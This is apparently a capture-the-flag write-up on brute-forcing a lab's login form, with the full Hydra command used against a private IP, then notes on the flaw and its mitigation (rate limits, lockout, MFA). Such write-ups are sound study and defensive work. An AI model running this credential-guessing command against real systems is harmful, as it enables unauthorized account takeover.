# Login Bruteforce

We used Hydra against the sign-in endpoint and successfully found valid credentials.

```bash
hydra -l admin -P 100k-most-used-passwords-NCSC.txt -s 80 -f -V 172.18.15.123 \
	http-get-form "/index.php:page=signin&username=^USER^&password=^PASS^&Login=Login:F=\"images/WrongAnswer.gif\""
```

After a successful login attempt, the challenge returned the flag.

## Vulnerability
The login form allowed too many password tries.

## Mitigation
Limit login attempts, add delays or temporary lock, and enable MFA.